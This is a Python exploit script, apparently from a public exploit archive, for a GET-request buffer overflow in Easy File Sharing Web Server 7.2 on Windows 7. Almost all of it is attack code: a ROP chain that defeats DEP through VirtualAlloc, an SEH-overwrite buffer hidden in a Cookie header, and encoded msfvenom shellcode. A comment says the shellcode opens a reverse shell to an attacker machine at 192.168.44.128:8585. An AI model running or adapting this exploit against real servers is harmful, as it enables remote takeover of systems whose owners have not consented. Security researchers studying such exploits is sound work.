#!/usr/bin/python
# Exploit Title: Easy File Sharing Web Server 7.2 - GET Buffer Overflow (DEP Bypass with ROP)
# Date: 8 July 2017
# Exploit Author: Sungchul Park
# Author Contact: lxmania7@gmail.com
# Vendor Homepage: http://www.sharing-file.com
# Software Link: http://www.sharing-file.com/efssetup.exe
# Version: Easy File Sharing Web Server 7.2
# Tested on: Winows 7 SP1

import socket, struct

def create_rop_chain():

	# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
		# For EDX -> flAllocationType(0x1000) [ EAX to EBX ]
        # 0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
        0x10015442,  # POP EAX # RETN [ImageLoad.dll]
		0xFFFFEFFF,  # -1001 (static value)
        0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]
		0x1001614d,  # DEC EAX # RETN [ImageLoad.dll] 
        0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
        0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
        0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
        0x10015442,  # POP EAX # RETN [ImageLoad.dll]
        0x1004de84,  # &Writable location [ImageLoad.dll]
		
		# For EDX -> flAllocationType(0x1000) [ EBX to EDX ]
		0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll]
		0x10022c1e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [ImageLoad.dll] 
		0xffffffff,  # Filler (Compensation for POP EBX)
		
		# For ESI -> &VirtualAlloc
		0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
		0xffffffff,  # Filler \
		0xffffffff,  # Filler  |
		0xffffffff,  # Filler  | => (Compensation for RETN 0x10)
		0xffffffff,  # Filler /
		0x1004d1fc,  # ptr to &VirtualAlloc() [IAT ImageLoad.dll]
		0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] 
		0x61c0a798,  # XCHG EAX,EDI # RETN [sqlite3.dll] 
		0x1001aeb4,  # POP ESI # RETN [ImageLoad.dll] 
		0xffffffff,  #  
		0x1001715d,  # INC ESI # ADD AL,3A # RETN [ImageLoad.dll] 
		0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] 
		
		# For EBP -> Return Address
		0x10013860,  # POP EBP # RETN [ImageLoad.dll] 
		0x61c24169,  # & push esp # ret  [sqlite3.dll]
		
		# For EBX -> dwSize(0x01)
		0x100132ba,  # POP EBX # RETN [ImageLoad.dll] 
		0xffffffff,  #  
		0x61c2785d,  # INC EBX # ADD AL,83 # RETN [sqlite3.dll] 
		0x1001f6da,  # INC EBX # ADD AL,83 # RETN [ImageLoad.dll] 
				
		# For ECX -> flProtect(0x40)
		0x10019dfa,  # POP ECX # RETN [ImageLoad.dll] 
		0xffffffff,  #  
		0x61c68081,  # INC ECX # ADD AL,39 # RETN [sqlite3.dll] 
		0x61c68081,  # INC ECX # ADD AL,39 # RETN [sqlite3.dll] 
		0x61c06831,  # ADD ECX,ECX # RETN [sqlite3.dll]
		0x61c06831,  # ADD ECX,ECX # RETN [sqlite3.dll]
		0x61c06831,  # ADD ECX,ECX # RETN [sqlite3.dll]
		0x61c06831,  # ADD ECX,ECX # RETN [sqlite3.dll]
		0x61c06831,  # ADD ECX,ECX # RETN [sqlite3.dll]
		0x61c06831,  # ADD ECX,ECX # RETN [sqlite3.dll]
		
		# For EDI -> ROP NOP
		0x61c373a4,  # POP EDI # RETN [sqlite3.dll] 
		0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
		# For EAX -> NOP(0x90)
		0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
		0x90909090,  # nop
		0x100240c2,  # PUSHAD # RETN [ImageLoad.dll] 
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

# msfvenom -p windows/shell/reverse_tcp LHOST=192.168.44.128 LPORT=8585 -b "\x00\x3b" -e x86/shikata_ga_nai -f python -v shellcode
shellcode = "\x90"*200
shellcode += "\xdb\xdd\xbb\x5e\x78\x34\xc0\xd9\x74\x24\xf4\x5e"
shellcode += "\x29\xc9\xb1\x54\x31\x5e\x18\x03\x5e\x18\x83\xc6"
shellcode += "\x5a\x9a\xc1\x3c\x8a\xd8\x2a\xbd\x4a\xbd\xa3\x58"
shellcode += "\x7b\xfd\xd0\x29\x2b\xcd\x93\x7c\xc7\xa6\xf6\x94"
shellcode += "\x5c\xca\xde\x9b\xd5\x61\x39\x95\xe6\xda\x79\xb4"
shellcode += "\x64\x21\xae\x16\x55\xea\xa3\x57\x92\x17\x49\x05"
shellcode += "\x4b\x53\xfc\xba\xf8\x29\x3d\x30\xb2\xbc\x45\xa5"
shellcode += "\x02\xbe\x64\x78\x19\x99\xa6\x7a\xce\x91\xee\x64"
shellcode += "\x13\x9f\xb9\x1f\xe7\x6b\x38\xf6\x36\x93\x97\x37"
shellcode += "\xf7\x66\xe9\x70\x3f\x99\x9c\x88\x3c\x24\xa7\x4e"
shellcode += "\x3f\xf2\x22\x55\xe7\x71\x94\xb1\x16\x55\x43\x31"
shellcode += "\x14\x12\x07\x1d\x38\xa5\xc4\x15\x44\x2e\xeb\xf9"
shellcode += "\xcd\x74\xc8\xdd\x96\x2f\x71\x47\x72\x81\x8e\x97"
shellcode += "\xdd\x7e\x2b\xd3\xf3\x6b\x46\xbe\x9b\x58\x6b\x41"
shellcode += "\x5b\xf7\xfc\x32\x69\x58\x57\xdd\xc1\x11\x71\x1a"
shellcode += "\x26\x08\xc5\xb4\xd9\xb3\x36\x9c\x1d\xe7\x66\xb6"
shellcode += "\xb4\x88\xec\x46\x39\x5d\x98\x43\xad\x9e\xf5\x60"
shellcode += "\xad\x77\x04\x79\x8c\x0e\x81\x9f\x9e\x40\xc2\x0f"
shellcode += "\x5e\x31\xa2\xff\x36\x5b\x2d\xdf\x26\x64\xe7\x48"
shellcode += "\xcc\x8b\x5e\x20\x78\x35\xfb\xba\x19\xba\xd1\xc6"
shellcode += "\x19\x30\xd0\x37\xd7\xb1\x91\x2b\x0f\xa0\x59\xb4"
shellcode += "\xcf\x49\x5a\xde\xcb\xdb\x0d\x76\xd1\x3a\x79\xd9"
shellcode += "\x2a\x69\xf9\x1e\xd4\xec\xc8\x55\xe2\x7a\x75\x02"
shellcode += "\x0a\x6b\x75\xd2\x5c\xe1\x75\xba\x38\x51\x26\xdf"
shellcode += "\x47\x4c\x5a\x4c\xdd\x6f\x0b\x20\x76\x18\xb1\x1f"
shellcode += "\xb0\x87\x4a\x4a\xc3\xc0\xb5\x08\xe1\x68\xde\xf2"
shellcode += "\xa5\x88\x1e\x99\x25\xd9\x76\x56\x0a\xd6\xb6\x97"
shellcode += "\x81\xbf\xde\x12\x47\x0d\x7e\x22\x42\xd3\xde\x23"
shellcode += "\x60\xc8\x37\xaa\x87\xef\x37\x4c\xb4\x39\x0e\x3a"
shellcode += "\xfd\xf9\x35\x35\xb4\x5c\x1f\xdc\xb6\xf3\x5f\xf5"


host = "192.168.44.139"
port = 80

max_size = 4000
seh_offset = 57
eax_offset = 73
rop_offset = 2788

buffer = "A" * seh_offset					# padding
buffer += "BBBB"							# nSEH Pointer
buffer += struct.pack("<I", 0x1002280a)		# SE Handler with stack pivot(# ADD ESP,1004 # RETN [ImageLoad.dll])
buffer += "A" * (eax_offset - len(buffer))	# padding
buffer += "DDDD"							# EAX overwrite
buffer += "C" * rop_offset
buffer += rop_chain
buffer += shellcode
buffer += "B" * (max_size - len(buffer))	# padding

# HTTP GET Request
request = "GET /vfolder.ghp HTTP/1.1\r\n"
request += "Host: " + host + "\r\n"
request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36" + "\r\n"
request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" + "\r\n"
request += "Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4" + "\r\n"
request += "Cookie: SESSIONID=3672; UserID=PassWD=" + buffer + "; frmUserName=; frmUserPass=;"
request += "\r\n"
request += "Connection: keep-alive" + "\r\n"
request += "If-Modified-Since: Thu, 06 Jul 2017 14:12:13 GMT" + "\r\n"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect=s.connect((host, port))

s.send(request + "\r\n\r\n")
s.close()
